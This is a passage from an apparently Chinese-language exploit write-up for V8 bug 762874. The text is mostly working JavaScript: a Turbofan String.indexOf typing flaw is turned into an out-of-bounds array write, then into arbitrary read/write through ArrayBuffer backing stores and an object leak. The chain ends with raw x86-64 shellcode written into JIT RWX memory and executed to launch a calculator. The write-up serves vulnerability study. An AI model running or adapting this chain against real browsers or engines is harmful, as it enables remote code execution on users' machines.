        let tmp = [];
        tmp[0] = parseInt(val % 0x100000000);
        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
        u32.set(tmp);
        return f64[0];
    }
    function foo(x)
    {
        // x = 2**28;
        let b = 'A'.repeat(2**30-25).indexOf('',x);
        let a = b + 25;
        let c = a >> 30;
        // print(c);
        let idx = c * 5;
        print(idx);
        let oobArray = [1.1,2.2,3.3,4.4];
        oobArray[idx] = 1.74512933848984e-310;//i2f(0x202000000000);
        return oobArray;
    }
    // for(var i=0;i 'A'.repeat(2**30-25).indexOf('',2**30-25)
    // 1073741799
    // d8> 1073741799+25
    // 1073741824
    // d8> 1073741824>>30
    // 1
    // d8> 
    /*
    0
    1.1
    0
    1.1
    ---------------------------------------------------    Begin compiling method foo using Turbofan
    ---------------------------------------------------    Finished compiling method foo using Turbofan
    5
    1.1*/
上面POC的效果是将oobArray的第5个元素修改成1.74512933848984e-310;//i2f(0x202000000000)
在debug模式下运行一下
从上图中可以发现OOB成功
## 3 EXP
接下来的流程就是和[之前](https://www.anquanke.com/post/id/214020)的利用方法相似了,只不过最后一步用的是JIT,使用ArrayBuffer
object 实现弹出计算器
如果不清楚这次利用的方法,建议阅读上面链接中的背景知识
####  3.1 change the size of oobArray
通过debug模式下的图解,我们可以知道我们要修改的是idx = 7的位置(如下图)
我尝试用下面的脚本进行修改大小时
    /*************************************************************
     * File Name: m_exp.js
     * 
     * Created on: xx.xx.xx
     * Author: init-0
     * 
     * Last Modified: 
     * Description: exp for 762874
    ************************************************************/
    function hex(i)
    {
        return i.toString(16).padStart(16, "0");
    }
    const MAX_ITERATIONS = 10000;
    const buf = new ArrayBuffer(8);
    const f64 = new Float64Array(buf);
    const u32 = new Uint32Array(buf);
    // Floating point to 64-bit unsigned integer
    function f2i(val)
    { 
        f64[0] = val;
        let tmp = Array.from(u32);
        return tmp[1] * 0x100000000 + tmp[0];
    }
    // 64-bit unsigned integer to Floating point
    function i2f(val)
    {
        let tmp = [];
        tmp[0] = parseInt(val % 0x100000000);
        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
        u32.set(tmp);
        return f64[0];
    }
    let obj = [];
    let ABuffer = [];
    function foo(x)
    {
        // x = 2**28;
        let b = 'A'.repeat(2**30-25).indexOf('',x);
        let a = b + 25;
        let c = a >> 30;
        // print(c);
        let idx = 7 * 5;
        // print(idx);
        let oobArray = [1.1,2.2,3.3,4.4];
        oobArray[idx] = 1.74512933848984e-310;//i2f(0x202000000000);
        return oobArray;
    }
    // for(var i=0;i "+hex(oob.length));
    %DebugPrint(oob);
    %SystemBreak();
按理说应该会改成0x2020
修改成功
####  3.2 Read and write at any address && obj leak
利用ArrayBuffer 的 Backstore指针 与 object
如果这一步不是很懂,可以看一下之前的[背景知识](https://www.anquanke.com/post/id/214020#h3-4)
本部分的代码如下
其中gc()函数是使得内存更加的稳定
    obj.push({mark:i2f(0x11111111),n:i2f(0x41414141)});
    ABuffer.push(new ArrayBuffer(0x200));
    gc();
    var off_buffer = 0;
    var off_obj = 0;
    for(var i=0;i 0x"+jit_addr.toString(16))
    var rwx_addr = abread(jit_addr+0x38) - 1 + 0x60
    console.log("rwx_addr ==> 0x"+rwx_addr.toString(16))
之后写入shellcode并执行
    var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
        96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
        105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
        72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
        72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
        184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
        94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];
    abwrite(rwx_addr,shellcode);
    jit();
    // f();
最终效果
## 4 遇到的问题
####  4.0
说明:下面的问题是我刚开始想使用wasm方法写exp遇到的
写exp脚本的时候遇到了下面的问题
    dataview.getFloat64(byteOffset [, littleEndian])
RangeError如果byteOffset超出了视图能储存的值，就会抛出错误.
这里最后的问题在于backstore的偏移找错了
应该是wasm的偏移找错了
解决方法在Debug模式下,打印出函数的地址,通过内存一点点找到RWX位置
打印出的函数地址,以及share_info位置
我们对应一下相对偏移(0x20)
同理利用上面的方法依次找到wasm instance RWX地址
实在不行,还可以search一下,比如上图我们找箭头的位置
下面的图片就不贴了,方法都是一样的
还有一个问题就是
下面脚本的位置有的时候在数字后面要加上’n’,有时不用 ,应该和不同版本的v8有关系
## 5 参考
 关于JIT寻找部分
除了上面这些参考,后面大部分都是探索出来的
## 6 总结
6.1 对于Turbofan的理解有时比具体的利用思路更加的重要
6.2 菜鸟还得继续努力